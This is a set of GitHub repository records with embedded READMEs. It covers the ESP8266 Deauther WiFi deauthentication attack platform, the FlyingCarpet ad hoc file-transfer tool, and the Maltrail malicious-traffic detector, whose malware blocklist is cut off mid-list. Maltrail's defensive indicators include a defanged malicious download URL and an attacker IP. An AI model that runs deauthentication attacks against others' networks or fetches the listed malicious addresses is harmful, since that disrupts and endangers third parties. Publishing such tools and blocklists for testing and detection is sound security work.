{"tags": [], "owner": "SpacehuhnTech", "description": "Affordable WiFi hacking platform for testing and learning", "name": "esp8266_deauther", "topics_string": "arduino attack board deauth deauther esp8266 hack scanning wifi", "language": "C", "readme": "\"# ESP8266 Deauther 2.0\\n\\n<p align=\\\"center\\\"><img alt=\\\"PICTURE logo\\\" src=\\\"https://raw.githubusercontent.com/wiki/spacehuhn/esp8266_deauther/img/deauther_logo.png\\\" width=\\\"200\\\"></p>\\n\\n<p align=\\\"center\\\">\\n\\ud83d\\udc26 <a href=\\\"https://twitter.com/spacehuhn\\\">Twitter</a>\\n| \\ud83d\\udcfa <a href=\\\"https://www.youtube.com/channel/UCFmjA6dnjv-phqrFACyI8tw\\\">YouTube</a>\\n| \\ud83c\\udf0d <a href=\\\"https://spacehuhn.de\\\">spacehuhn.de</a><br>\\n<br>\\n<b>Scan for WiFi devices, block selected connections, create dozens of networks and confuse WiFi scanners!<br><br>\\nClick <a href=\\\"https://github.com/spacehuhn/esp8266_deauther/wiki/Installation\\\">here</a> for the installation tutorial.<br>\\n Click <a href=\\\"https://github.com/spacehuhn/esp8266_deauther/releases\\\">here</a> for the .bin files.<br><br>\\nSupport the development of this project by purchasing one of the <a href=\\\"https://github.com/spacehuhn/esp8266_deauther/wiki/Supported-Devices\\\">official deauther boards</a>.<br/>\\nOr become a patron on <a href=\\\"https://patreon.com/spacehuhn\\\" target=\\\"_blank\\\">patreon.com/spacehuhn</a>.<br>\\nAlso available: <a href=\\\"https://www.tindie.com/products/Spacehuhn/spacehuhn-stickers/\\\">Stickers</a></b>!\\n</p>\\n\\n# [\\ud83d\\udc49 Wiki](https://github.com/SpacehuhnTech/esp8266_deauther/wiki)\\n# [\\ud83d\\udc49 Binaries](https://github.com/SpacehuhnTech/esp8266_deauther/releases)\\n# [\\ud83d\\udc49 Development Boards](https://github.com/SpacehuhnTech/esp8266_deauther/wiki/Supported-Devices)\\n\\n## What is New\\n[Here is a quick video about what is new](https://youtu.be/6oRmm3xfp6U) \\nVersion 2.0:\\n- Completly rewritten code base for better performance and later enhancements\\n- Custom Deauther SDK for easy compiling using Arduino\\n- New serial command line interface to control and debug the program\\n- New display UI with a lot of new functions\\n- Improved web interface with multi-language support\\n- Improved scanning for access points and stations (+ continuous scanning mode)\\n- Save and select device names for both scanning and attacking\\n- Save up to 60 SSIDs and 25 devices in one list (you can create, load and save multiple lists)\\n- Added [PacketMonitor](https://github.com/spacehuhn/PacketMonitor) to display UI\\n- Deauth detection when scanning\\n- RGB LED support for a quick indication what the device is doing (attacking, scanning, ...)\\n- Better documentation on the new [wiki](https://github.com/spacehuhn/esp8266_deauther/wiki)\\n\\n## About this project\\nThis software allows you to easily perform a variety of actions to test 802.11 wireless networks by using an inexpensive ESP8266 WiFi SoC (System On A Chip). \\n\\nThe main feature, the deauthentication attack, is used to disconnect devices from their WiFi network. \\nNo one seems to care about this huge vulnerability in the official 802.11 WiFi standard, so I took action and enabled everyone who has less than 10 USD to spare to recreate this project. \\nI hope it raises more attention on the issue. In 2009 the WiFi Alliance actually fixed the problem (see [802.11w](https://en.wikipedia.org/wiki/IEEE_802.11w-2009)), but only a few companies implemented it into their devices and software. \\nTo effectively prevent a deauthentication attack, both client and access point must support the 802.11w standard with protected management frames (PMF). \\nWhile most client devices seem to support it when the access point forces it, basically no WiFi access point has it enabled. \\n\\nFeel free to test your hardware out, annoy these companies with the problem, share this project and push for a fix!\\nThis project is also a great way to learn more about WiFi, micro controllers, Arduino, hacking and electronics/programming in general. \\n**But please use this tool responsibly and do not use it against others without their permission!**\\n\\nThe difference between deauthing and jamming: [click me](https://github.com/spacehuhn/esp8266_deauther/wiki/FAQ#difference-between-jammer-and-deauther)\\n\\n## Official Deauther Boards\\n\\n![PICTURE DSTIKE Deauther OLED Board](https://raw.githubusercontent.com/wiki/spacehuhn/esp8266_deauther/img/DSTIKE_Deauther_Board.jpg)\\n\\nIf you want to support the development of this project, you can buy one of the official boards by DSTIKE (Travis Lin) on following sites: \\n- [Tindie](https://tindie.com/stores/lspoplove) \\n- [AliExpress](https://dstike.aliexpress.com/store/2996024) \\n- [Taobao](https://shop135375846.taobao.com) \\n\\nThose boards are optimized for this project, ready to use and come preflashed with the Deauther software! \\nFor more details visit the [Wiki](https://github.com/spacehuhn/esp8266_deauther/wiki) under [Supported Devices](https://github.com/spacehuhn/esp8266_deauther/wiki/Supported-Devices). \\n\\n## Disclaimer\\nThis project is a proof of concept for testing and educational purposes. \\nNeither the ESP8266, nor its SDK was meant or built for such purposes. Bugs can occur! \\n\\nUse it only against your own networks and devices! \\nPlease check the legal regulations in your country before using it. \\nI don't take any responsibility for what you do with this program. \\n\\nIt is **not a frequency jammer** as claimed falsely by many people. Its attack, its method and how to protect against it is described above. It uses valid Wi-Fi frames described in the IEEE 802.11 standard and doesn't block or disrupt any frequencies. \\n\\nThis project is meant to draw more attention on this issue. \\nThe [deauthentication](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) attack shows how vulnerable the 802.11 Wi-Fi standard is and that it has to be fixed. \\nA solution is already there, why don't we use it?\\n\\n**Please don't refer to this project as \\\"jammer\\\", that totally undermines the real purpose of this project!**\\nIf you do, it only proves that you didn't understand anything of what this project stands for. Publishing content about this without a proper explanation shows that you only do it for the clicks, fame and/or money and have no respect for intellectual property, the community behind it and the fight for a better WiFi standard! \\n\\n## Getting Started\\n\\nVisit our new [Wiki](https://github.com/spacehuhn/esp8266_deauther/wiki) on how to recreate this project and use it. \\nHappy Hacking!\\n\\n## Credits\\nA huge thanks to:\\n- [@deantonious](http://github.com/deantonious)\\n- [@jLynx](https://github.com/jLynx)\\n- [@lspoplove](https://github.com/lspoplove)\\n- [@schinfo](https://github.com/schinfo)\\n- [@tobozo](https://github.com/tobozo)\\n- [@xdavidhu](https://github.com/xdavidhu)\\n- [@PwnKitteh](https://github.com/PwnKitteh)\\n\\nfor helping out with various things regarding this project and keeping it alive! \\n\\nI also want to thank Espressif and their community for this awesome chip and all the software and hardware projects around it and the countless tutorials you can find online! \\n\\nShoutout to everyone working on the libraries used for this project:\\n- [esp8266-oled-ssd1306](https://github.com/ThingPulse/esp8266-oled-ssd1306)\\n- [ArduinoJson](https://github.com/bblanchon/ArduinoJson)\\n- [LinkedList](https://github.com/ivanseidel/LinkedList)\\n\\nAlso thanks to everyone that supports this project by [donating](http://spacehuhn.de/donate), being my [patron](http://patreon.com/spacehuhn) or buying one of the [official Deauther boards](https://www.tindie.com/stores/lspoplove) from DSTIKE. \\n\\n## License \\n\\nThis software is licensed under the MIT License. See the [license file](LICENSE) for details. \\n\"", "topics": ["arduino", "attack", "board", "deauth", "deauther", "esp8266", "hack", "scanning", "wifi"], "writeup": "", "ignoredescription": false, "id": 43, "full_name": "SpacehuhnTech/esp8266_deauther", "url": "https://github.com/SpacehuhnTech/esp8266_deauther"},
{"tags": [], "owner": "spieglt", "description": "Encrypted file transfer over ad hoc WiFi. No network infrastructure required, just two laptops in close range. Linux, Mac, and Windows.", "name": "FlyingCarpet", "topics_string": "file-transfer", "language": "Go", "readme": "\"# Flying Carpet\\n\\nTo download, visit the [releases](https://github.com/spieglt/FlyingCarpet/releases) page!\\n\\nWireless, encrypted file transfer over automatically configured ad hoc networking. No network infrastructure required (access point, router, switch). Just two laptops (Mac, Linux, and Windows supported) with wireless chips in close range.\\n\\nDon't have a flash drive? Don't have access to a wireless network or don't trust one? Need to move a file larger than 2GB between different filesystems but don't want to set up a file share? Try it out!\\n\\n# Screenshots:\\n\\n<img src=\\\"pictures/winDemo.png\\\" width=400> <img src=\\\"pictures/macDemo.png\\\" width=400> <img src=\\\"pictures/linuxDemo.png\\\" width=400> \\n\\n# Features:\\n\\n+ Cross-platform: Linux, Mac, and Windows.\\n\\n+ Transfer multiple files at once, without losing progress if the transfer is interrupted or canceled.\\n\\n+ Speeds over 120mbps (with laptops close together).\\n\\n+ Does not use Bluetooth or your local network, just wireless chip to wireless chip.\\n\\n+ Files encrypted in transit.\\n\\n+ Large files supported (<10MB RAM usage while transferring a 4.5GB file).\\n\\n+ No installation required and no dependencies needed.\\n\\n+ Interoperable GUI and CLI versions.\\n\\n# GUI Compilation instructions:\\n\\n+ `go get -x github.com/spieglt/flyingcarpet`\\n\\n+ Windows only: Open `flyingcarpet\\\\WFD_DLL\\\\WFD_DLL.sln` with Visual Studio, and compile in Release mode for x64.\\n\\n+ If compiling on Windows, get `mt.exe` (available in Windows SDKs) and make sure it's in your path.\\n\\n+ Go through the entire setup guide for ![therecipe/qt](https://github.com/therecipe/qt/wiki/Installation) and make sure `qtdeploy` is in your path.\\n\\n+ Install ![go.rice](https://github.com/GeertJohan/go.rice) and make sure `rice` is in your path.\\n\\n+ Run `.\\\\wg_rebuild.ps1` from Powershell (for Windows), `./mg_rebuild` from Terminal (for Mac), or `./lg_rebuild` (for Linux).\\n\\n# CLI Compilation instructions\\n\\n+ `go get -x github.com/spieglt/flyingcarpet`\\n\\n+ Windows only: Open `flyingcarpet\\\\WFD_DLL\\\\WFD_DLL.sln` with Visual Studio, and compile in Release mode for x64. Then install ![go.rice](https://github.com/GeertJohan/go.rice) and make sure `rice` is in your path.\\n\\n+ `cd $GOPATH/src/github.com/spieglt/flyingcarpet/cli`\\n\\n+ Windows only: `.\\\\embed_dll.ps1` from Powershell\\n\\n+ `go build -o flyingcarpet.exe`\\n\\n# Restrictions:\\n\\n+ The Mac version is a standard `.app` bundle, the Linux version is an executable that writes dependencies to a temp location and runs from there, and the Windows version is a `.zip` with an `.exe` and other dependencies inside. I'm working on a better solution for Windows. It was a standalone `.exe` when I was using wxWidgets but this has not been possible since moving to Qt. PRs welcome.\\n\\n+ 64-bit only. Supported Operating Systems: macOS 10.12+, Windows 7+, and Linux Mint 18. I only have access to so many laptops, so if you've tried on other platforms please let me know whether it worked. \\n\\n+ Disables your wireless internet connection while in use (does not apply to Windows when receiving).\\n\\n+ On Mac: You may have to right-click and select \\\"Open\\\" if your settings don't allow running unsigned applications. \\n\\n+ On Windows: Click \\\"More info\\\" and \\\"Run anyway\\\" if you receive a Windows SmartScreen prompt. You may also need to disable WiFi Sense.\\n\\n+ I need help testing on Linux and supporting non-Debian-based distributions! Currently only confirmed to work on Mint 18, and only on wireless cards/drivers that support ad hoc networking with `nmcli`.\\n\\n+ Flying Carpet should rejoin you to your previous wireless network after a completed or canceled transfer. This will not happen if the program freezes, crashes, or if the windows is closed during operation.\\n\\n# Planned features:\\n\\n+ Drag and drop for sending files.\\n\\n+ Folder upload.\\n\\n+ Replace `netsh wlan` with Native WiFi API on Windows.\\n\\n+ Mobile versions, integrating functionality from https://github.com/claudiodangelis/qr-filetransfer.\\n\\nLicenses for third-party tools and libraries used can be found in the \\\"3rd_party_licenses\\\" folder.\\n\\nIf you've used Flying Carpet, please send me feedback! Thank you for your interest!\\n\"", "topics": ["file-transfer"], "writeup": "", "ignoredescription": false, "id": 44, "full_name": "spieglt/FlyingCarpet", "url": "https://github.com/spieglt/FlyingCarpet"},
{"tags": [], "owner": "stamparm", "description": "Malicious traffic detection system", "name": "maltrail", "topics_string": "heuristics intrusion-detection malware network-monitoring python security sensor", "language": "Python", "readme": "\"![Maltrail](https://i.imgur.com/3xjInOD.png)\\n\\n[![Python 2.6|2.7|3.x](https://img.shields.io/badge/python-2.6|2.7|3.x-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-MIT-red.svg)](https://github.com/stamparm/maltrail#license) [![Malware families](https://img.shields.io/badge/malware_families-1265-orange.svg)](https://github.com/stamparm/maltrail/tree/master/trails/static/malware) [![Malware sinkholes](https://img.shields.io/badge/malware_sinkholes-1330-green.svg)](https://github.com/stamparm/maltrail/tree/master/trails/static/malware) [![Twitter](https://img.shields.io/badge/twitter-@maltrail-blue.svg)](https://twitter.com/maltrail)\\n\\n## Content\\n\\n- [Introduction](#introduction)\\n- [Architecture](#architecture)\\n- [Quick start](#quick-start)\\n- [Administrator's guide](#administrators-guide)\\n - [Sensor](#sensor)\\n - [Server](#server)\\n- [User's guide](#users-guide)\\n - [Reporting interface](#reporting-interface)\\n- [Real-life cases](#real-life-cases)\\n - [Mass scans](#mass-scans)\\n - [Anonymous attackers](#anonymous-attackers)\\n - [Service attackers](#service-attackers)\\n - [Malware](#malware)\\n - [Suspicious domain lookups](#suspicious-domain-lookups)\\n - [Suspicious ipinfo requests](#suspicious-ipinfo-requests)\\n - [Suspicious direct file downloads](#suspicious-direct-file-downloads)\\n - [Suspicious HTTP requests](#suspicious-http-requests)\\n - [Port scanning](#port-scanning)\\n - [DNS resource exhaustion](#dns-resource-exhaustion)\\n - [Data leakage](#data-leakage)\\n - [False positives](#false-positives)\\n- [Requirements](#requirements)\\n- [Best practice(s)](#best-practices)\\n- [License](#license)\\n- [Developers](#developers)\\n- [Presentations](#presentations)\\n- [Blacklist](#blacklist)\\n- [Thank you](#thank-you)\\n- [Third-party integrations](#third-party-integrations)\\n\\n## Introduction\\n\\n**Maltrail** is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. `zvpprsensinaix.com` for [Banjori](http://www.johannesbader.ch/2015/02/the-dga-of-banjori/) malware), URL (e.g. `hXXp://109.162.38.120/harsh02.exe` for known malicious [executable](https://www.virustotal.com/en/file/61f56f71b0b04b36d3ef0c14bbbc0df431290d93592d5dd6e3fffcc583ec1e12/analysis/)), IP address (e.g. `185.130.5.231` for known attacker) or HTTP User-Agent header value (e.g. `sqlmap` for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).\\n\\n![Reporting tool](https://i.imgur.com/Sd9eqoa.png)\\n\\nThe following (black)lists (i.e. feeds) are being utilized:\\n\\n```\\n360chinad, 360conficker, 360cryptolocker, 360gameover, 360locky, 360necurs, \\n360tofsee, 360virut, abuseipdb, alienvault, atmos, badips, \\nbambenekconsultingc2dns, bambenekconsultingdga, bitcoinnodes, blackbook, \\nblocklist, botscout, bruteforceblocker, ciarmy, cobaltstrike, cruzit, \\ncybercrimetracker, dataplane, dshielddns, dshieldip, emergingthreatsbot, \\nemergingthreatscip, emergingthreatsdns, feodotrackerip, greensnow, loki, \\nmalc0de, malwaredomainlistdns, malwaredomains, maxmind, minerchk, myip, \\nopenphish, palevotracker, policeman, pony, proxylists, proxyrss, proxyspy, \\nransomwaretrackerdns, ransomwaretrackerip, ransomwaretrackerurl, riproxies, \\nrutgers, sblam, socksproxy, sslbl, sslproxies, talosintelligence, torproject, \\ntrickbot, turris, urlhaus, urlvir, vxvault, zeustrackermonitor, zeustrackerurl,\\netc.\\n```\\n\\nAs of static entries, the trails for the following malicious entities (e.g. malware C&Cs or sinkholes) have been manually included (from various AV reports and personal research):\\n\\n```\\n404, 9002, aboc, ab, acbackdoor, acridrain, activeagent, advisorbot, adwind, \\nadylkuzz, adzok, afrodita, agaadex, agenttesla, aldibot, alina, allakore, \\nalmalocker, almashreq, alpha, alureon, amadey, amavaldo, amend_miner, ammyyrat, \\nandroid_acecard, android_adrd, android_alienspy, android_anubis, \\nandroid_arspam, android_asacub, android_backflash, android_bankbot, \\nandroid_bankun, android_basbanke, android_basebridge, android_besyria, \\nandroid_boxer, android_buhsam, android_busygasper, android_callerspy, \\nandroid_camscanner, android_cerberus, android_chuli, android_claco, \\nandroid_clickfraud, android_cometbot, android_coolreaper, android_copycat, \\nandroid_counterclank, android_cyberwurx, android_dendoroid, android_dougalek, \\nandroid_droidjack, android_droidkungfu, android_enesoluty, android_ewalls, \\nandroid_ewind, android_exodus, android_exprespam, android_fakeapp, \\nandroid_fakebanco, android_fakedown, android_fakeinst, android_fakelog, \\nandroid_fakemart, android_fakemrat, android_fakeneflic, android_fakesecsuit, \\nandroid_fanta, android_feabme, android_flexispy, android_fraudbot, \\nandroid_frogonal, android_funkybot, android_geinimi, android_generic, \\nandroid_geost, android_ghostpush, android_ginmaster, android_gmaster, \\nandroid_godwon, android_golddream, android_goldencup, android_golfspy, \\nandroid_gonesixty, android_gplayed, android_gustuff, android_henbox, \\nandroid_hiddad, android_ibanking, android_joker, android_jsmshider, \\nandroid_kbuster, android_kemoge, android_lockdroid, android_lotoor, \\nandroid_lovetrap, android_malbus, android_maxit, android_mobstspy, \\nandroid_monokle, android_notcompatible, android_oneclickfraud, android_opfake, \\nandroid_ozotshielder, android_pikspam, android_pjapps, android_qdplugin, \\nandroid_ransomware, android_redalert, android_remotecode, android_repane, \\nandroid_riltok, android_roamingmantis, android_roidsec, android_rotexy, \\nandroid_samsapo, android_sandrorat, android_selfmite, android_shadowvoice, \\nandroid_shopper, android_simbad, android_simplocker, android_skullkey, \\nandroid_sndapps, android_spytekcell, android_stels, android_swanalitics, \\nandroid_teelog, android_telerat, android_tetus, android_tonclank, \\nandroid_torec, android_triada, android_uracto, android_usbcleaver, \\nandroid_viceleaker, android_walkinwat, android_windseeker, android_wirex, \\nandroid_xavirad, android_xhelper, android_zertsecurity, android_ztorg, \\nandromeda, antefrigus, antibot, anubis, anuna, apt_01, apt_09, apt_12, apt_17, \\napt_18, apt_23, apt_30, apt_33, apt_37, apt_38, apt_aridviper, apt_babar, \\napt_bahamut, apt_barium, apt_bisonal, apt_bitter, apt_blacktech, \\napt_blindeagle, apt_blueprint, apt_bookworm, apt_buhtrap, apt_calypso, \\napt_careto, apt_casper, apt_cdt, apt_chafer, apt_charmingkitten, apt_cleaver, \\napt_cloudatlas, apt_cobaltdickens, apt_commentcrew, apt_copykittens, \\napt_cosmicduke, apt_cyberbit, apt_darkhotel, apt_darkhydrus, apt_deadlykiss, \\napt_deeppanda, apt_desertfalcon, apt_dnspionage, apt_docless, \\napt_domestickitten, apt_donot, apt_dragonok, apt_duke, apt_dustsquad, \\napt_energeticbear, apt_equationgroup, apt_evapiks, apt_ezq, \\napt_familiarfeeling, apt_finfisher, apt_flame, apt_fruityarmor, apt_gallmaker, \\napt_gamaredon, apt_gaza, apt_glasses, apt_goblinpanda, apt_goldenbird, \\napt_goldenrat, apt_goldmouse, apt_gorgon, apt_gothicpanda, apt_gref, \\napt_greyenergy, apt_groundbait, apt_group5, apt_hackingteam, apt_hermit, \\napt_hogfish, apt_icefog, apt_innaput, apt_irn2, apt_irontiger, apt_ke3chang, \\napt_keyboy, apt_kimsuky, apt_lazarus, apt_leafminer, apt_lotusblossom, \\napt_luckymouse, apt_lyceum, apt_machete, apt_magichound, apt_menupass, \\napt_middleeast, apt_miniduke, apt_mudcarp, apt_muddywater, apt_mustangpanda, \\napt_naikon, apt_nettraveler, apt_newsbeef, apt_oceanlotus, apt_oilrig, \\napt_packrat, apt_patchwork, apt_pegasus, apt_pkplug, apt_platinum, \\napt_pokingthebear, apt_potao, apt_quarian, apt_quasar, apt_rancor, apt_reaper, \\napt_redbaldknight, apt_redoctober, apt_rnexus, apt_rocketman, apt_sandworm, \\napt_sauron, apt_scanbox, apt_scarcruft, apt_scarletmimic, apt_scieron, \\napt_sectora05, apt_shamoon, apt_shiqiang, apt_sidewinder, apt_silence, \\napt_simbaa, apt_snowman, apt_sobaken, apt_sofacy, apt_stealthfalcon, \\napt_stolenpencil, apt_stonedrill, apt_strongpity, apt_stuxnet, apt_ta2101, \\napt_ta428, apt_ta555, apt_tajmahal, apt_telebots, apt_tempperiscope, \\napt_temptingcedar, apt_tibet, apt_tick, apt_tortoiseshell, \\napt_transparenttribe, apt_turla, apt_tvrms, apt_unclassified, \\napt_volatilecedar, apt_weakestlink, apt_webky, apt_whitecompany, \\napt_wickedpanda, apt_windshift, apt_wirte, arcane, arec, ares, arkei, artro, \\naspire, asruex, astaroth, astrobot, asyncrat, athenagorat, atilla, \\natm_dispcash, atomlogger, attor, aurora, autoit, avalanche, avemaria, avrecon, \\naxpergle, azorult, babybot, babyshark, bachosens, backnet, badblock, badrabbit, \\nbalamid, baldr, balkanrat, bamital, bandook, bankapol, bankerflux, bankpatch, \\nbanload, banprox, banwarum, barys, bayrob, beamwinhttp, beapy, bebloh, bedep, \\nbeebone, belonard, betabot, bezigaterat, biskvit, bitpaymer, bitshifter, \\nblackmoon, blacknet, blacknixrat, blackrat, blackshades, blacksquid, blackworm, \\nblockbuster, bluebananarat, bluebot, bluecrab, bobax, bolek, bolik, bondat, \\nbondnet, borr, bot_mikrotik, bozokrat, bredolab, breut, brushaloader, bubnix, \\nbucriv, buer, bulehero, bunitu, buran, buterat, butter, cactustorch, calfbot, \\ncamerashy, cannibalrat, capturatela, carberp, cardinalrat, casbaneiro, \\nccleaner_backdoor, ceidpagelock, cerber, chainshot, changeup, chanitor, \\nchasebot, cheshire, chewbacca, chinachopper, chisbur, chthonic, cirenegrat, \\nclientmeshrat, clipsa, cloudatlas, coalabot, cobalt, cobint, cometer, \\nconficker, contopee, corebot, cotxrat, couponarific, criakl, cridex, crilock, \\ncrimsonrat, cryakl, crylocker, cryptbot, cryptfile2, cryptinfinite, \\ncryptodefense, cryptolocker, cryptowall, cryptxxx, ctblocker, cutwail, \\ncybergaterat, cythosia, dailyscriptlet, damoclis, danabot, dangerous, danji, \\ndarkcloud, darkcrystalrat, darkgate, darkrat, darkshell, darkware, dcrat, \\ndefru, delshad, denizkizi, deprimon, destory, dexter, dharma, diamondfoxrat, \\ndimnie, dircrypt, dirtjumper, dmalocker, dmsniff, dnsbirthday, dnschanger, \\ndnstrojan, dofoil, domen, dorifel, dorkbot, dorshel, dorv, drahma, drapion, \\ndridex, dropnak, dualtoy, dupzom, dursg, dyreza, elf_aidra, elf_amnesiark, \\nelf_billgates, elf_chalubo, elf_chinaz, elf_coinminer, elf_darlloz, \\nelf_ddosman, elf_dofloo, elf_ekoms, elf_emptiness, elf_evilgnome, elf_gafgyt, \\nelf_generic, elf_groundhog, elf_hacked_mint, elf_hajime, elf_hellobot, \\nelf_hiddenwasp, elf_hideseek, elf_httpsd, elf_iotreaper, elf_kaiten, \\nelf_kerberods, elf_lady, elf_mayhem, elf_mirai, elf_mokes, elf_mumblehard, \\nelf_openssh_backdoorkit, elf_pacha, elf_pasteminer, elf_pinscan, elf_qbot, \\nelf_ransomware, elf_rekoobe, elf_roboto, elf_routex, elf_shelldos, elf_skidmap, \\nelf_slexec, elf_sshdoor, elf_sshscan, elf_themoon, elf_torii, elf_tunpot, \\nelf_turla, elf_vpnfilter, elf_xbash, elf_xnote, elf_xorddos, elpman, emdivi, \\nemogen, emotet, empirerat, eredel, escelar, esfur, evilbunny, evilgrab, \\nevilnum, evoltinpos, evrial, expiro, fakben, fakeadobe, fakeav, fakeran, \\nfantom, fareit, farseer, fastloader, fbi_ransomware, felixhttp, fiexp, \\nfignotok, filespider, fin4, fin6, fin7, fin8, fin9, finderbot, findpos, floxif, \\nfnumbot, fobber, formbook, fox, frankenstein, fraudload, fruitfly, ftcode, \\nfudcrypt, fynloski, fysna, gamapos, gandcrab, gaudox, gauss, gbot, generic, \\ngermanwiper, gh0strat, ghostdns, ghost_miner, glitchpos, globeimposter, \\nglupteba, gobotkr, gobrut, godzilla, goldbrute, golroted, gootkit, grandoreiro, \\ngrand, gravityrat, greamerat, gruntstager, gtbot, guildma, hacking_team, \\nharnig, hawkball, hawkeye, helompy, heodo, hiddenbeer, hiddenbee, hiddencobra, \\nhiddentear, hiloti, hinired, hisoka, hollow_miner, honeybee, hoplight, houdini, \\nhuntpos, hvncrat, hydracrypt, hydseven, icedid, imminentrat, immortal, \\ninfinityrat, injecto, innfirat, investimer, invisimole, ios_keyraider, \\nios_muda, ios_oneclickfraud, ios_realtimespy, ios_specter, ios_xcodeghost, \\niron, ismdoor, isodisk, ispy, isr, jackpos, jacksbot, jasperloader, javarat, \\njigsaw, jrat, jripbot, jsoutprox, jssloader, karkoff, kasidet, kazy, kbot, \\nkegotip, keitaro, kelihos, keybase, khrat, killrabbit, killua, king_miner, \\nkingslayer, kjw0rm, kolab, konni, koobface, korgo, korplug, kovter, kpot, \\nkradellsh, kromagent, kronos, krown, krugbot, krypton, kuago_miner, kulekmoko, \\nl0rdix, ladon, lampion, latentbot, legion_loader, limerat, litehttp, \\nloadpcbanker, lockbit, locked, locky, loda, lokibot, lollipop, loocipher, \\nloopbackrat, lostdoorrat, loud_miner, lucifer, luckycat, lucky, \\nluminositylinkrat, luoxk, luxnetrat, mado_miner, magicpos, magniber, majikpos, \\nmambashim, mamo, manabot, mancsyn, mandaph, maplebot, marap, mariposa, \\nmarmoolak, marsjoke, marut, masad, mastermana, matrix, matsnu, maze, mdrop, \\nmebroot, medbot, medusahttp, megacortex, megalodonhttprat, megaopac, megumin, \\nmekotio, mercurybot, mestep, metamorfo, midie, milkyboy, millionware, minedoor, \\nminotaur, misogow, mispadu, miuref, modirat, modpos, monero_backdoor, \\nmonsterinstall, moonlight, moreeggs, morto, morty, mozart, muhstik, \\nmysticalnet, nampohyu, nanocore, nbot, necurs, neko, nemeot, nemty, nemucod, \\nneonwallet, neshuta, nestrat, netsupport, netwire, neutrinopos, newddosbot, \\nnewpos, nexlogger, ngioweb, nigelthorn, nionspy, nitol, nivdort, njrat, \\nnodersok, nonbolqu, notpetya, notrobin, novaloader, novel_miner, novobot, \\nnovter, nozelesn, nucleartor, nuqel, nwt, nymaim, nymeria, obliquerat, odcodc, \\noficla, onkods, optima, orcusrat, oski, ostap, osx_bundlore, osx_coinminer, \\nosx_coldroot, osx_generic, osx_gmera, osx_imuler, osx_keranger, osx_keydnap, \\nosx_linker, osx_lol, osx_loselose, osx_macspy, osx_mami, osx_mokes, \\nosx_mughthesec, osx_proton, osx_salgorea, osx_shlayer, osx_trikster, \\nosx_wirelurker, padcrypt, pandabanker, paradoxrat, parallax, parasitehttprat, \\npatchbrowse, paycrypt, pcastle, pcshare, pdfjsc, pepperat, peppyrat, \\nperl_shellbot, perseusrat, petya, pghost, phoenix, phorpiex, photo_miner, \\nphpstudyghost, phytob, picgoo, pift, pinkslipbot, pipka, piratematryoshka, \\npiritebot, plasmarat, plead, plugx, plurox, poisonivy, poisonrat, ponmocup, \\nposhcoder, pots, powelike, powerpool, powershell_injector, predatory, proced, \\npropagate, prorat, proslikefan, prostoclipper, prostoloader, protonbot, prowli, \\nproxyback, psixbot, punisherrat, pupyrat, purplefox, pushdo, pykspa, pyleet, \\npylocky, pypi_backdoor, pyrogenic, python_brost, python_injector, python_xwo, \\npyxierat, qakbot, qeallerrat, qrat, quadagent, quantloader, quasarrat, qulab, \\nqwertminer, raasberry, raccoon, ragnarok, rajump, rakhni, ramdo, ramnit, \\nranion, ransirac, ransomed, rarog, razy, reactorbot, reaver, redaman, \\nrediswannamine, redsip, reductor, remcos, remexirat, renocide, revcoderat, \\nrevengerat, reveton, revetrat, rincux, rmsrat, rombertik, rovnix, rozena, rtm, \\nrubella, ruby_backdoor, ruftar, runforestrun, rustock, ryuk, saefkorat, sage, \\nsakabota, sakari, sakurel, sality, samsam, sanny, satana, sathurbot, scanbox, \\nscarcruft, scranos, sdbot, seaduke, sectoprat, sefnit, selfdel, severe, \\nshadownet, shadowtechrat, shelma, shifu, shimrat, shiotob, shurl0ckr, shylock, \\nsiesta, silentbrute, silly, simda, sinkhole_360netlab, sinkhole_abuse, \\nsinkhole_arbor, sinkhole_bitdefender, sinkhole_bitsight, sinkhole_blacklab, \\nsinkhole_bomccss, sinkhole_botnethunter, sinkhole_certgovau, sinkhole_certpl, \\nsinkhole_changeip, sinkhole_checkpoint, sinkhole_cirtdk, sinkhole_cncert, \\nsinkhole_collector, sinkhole_conficker, sinkhole_cryptolocker, \\nsinkhole_dnssinkhole, sinkhole_doombringer, sinkhole_drweb, sinkhole_dynadot, \\nsinkhole_dyre, sinkhole_farsight, sinkhole_fbizeus, sinkhole_fireeye, \\nsinkhole_fitsec, sinkhole_fnord, sinkhole_fraunhofer, sinkhole_gamaredon, \\nsinkhole_gameoverzeus, sinkhole_georgiatech, sinkhole_gladtech, sinkhole_hyas, \\nsinkhole_infosecjp, sinkhole_kaspersky, sinkhole_kryptoslogic, \\nsinkhole_menupass, sinkhole_microsoft, sinkhole_noip, sinkhole_nowdns, \\nsinkhole_oceanlotus, sinkhole_opendns, sinkhole_rsa, sinkhole_secureworks, \\nsinkhole_securityscorecard, sinkhole_shadowserver, sinkhole_sidnlabs, \\nsinkhole_sinkdns, sinkhole_sobaken, sinkhole_sofacy, sinkhole_spamandabuse, \\nsinkhole_sugarbucket, sinkhole_supportintel, sinkhole_switch, sinkhole_tech, \\nsinkhole_torpig, sinkhole_tsway, sinkhole_turla, sinkhole_unknown, \\nsinkhole_vicheck, sinkhole_virustracker, sinkhole_vittalia, \\nsinkhole_wapacklabs, sinkhole_xaayda, sinkhole_yourtrap, sinkhole_zinkhole, \\nskeeyah, skidrat, skynet, skyper, slenfbot, sload, slserver, smallnetrat, \\nsmokebot, smokeloader, smominru, smsfakesky, snatch, snifula, snslocker, \\nsockrat, sodinokibi, sohanad, sonoko, sorano, spideybot, spybotpos, spyeye, \\nspygaterat, stabuniq, stantinko, stealzilla, strictor, supremebot, surtr, \\nsusafone, svproxy, swamprat, symmi, syndicasec, synolocker, syscon, sysrat, \\nsystembc, systemd_miner, sysworm, t1087, ta505, tables, taskmasters, tdss, \\nteambot, teamspy, teerac, telebots, telegrab, terracotta, teslacrypt, tflower, \\ntinba, tinynuke, tinypos, tofsee, tor_backdoor, torpig, torrentlocker, \\ntovkater, travle, treasurehunter, trickbot, troldesh, tron, tscookie, tuhkit, \\ntupym, turkojanrat, tvrat, tvspy, udpos, unruy, up007, upatre, urausy, urlzone, \\nursnif, vaimalandra, varenyky, vawtrak, vbcheman, vbrat, vidar, viknok, \\nvinderuf, virobot, virtum, virusrat, virut, vittalia, vjw0rm, vobfus, \\nvssdestroy, vundo, wacatac, waledac, 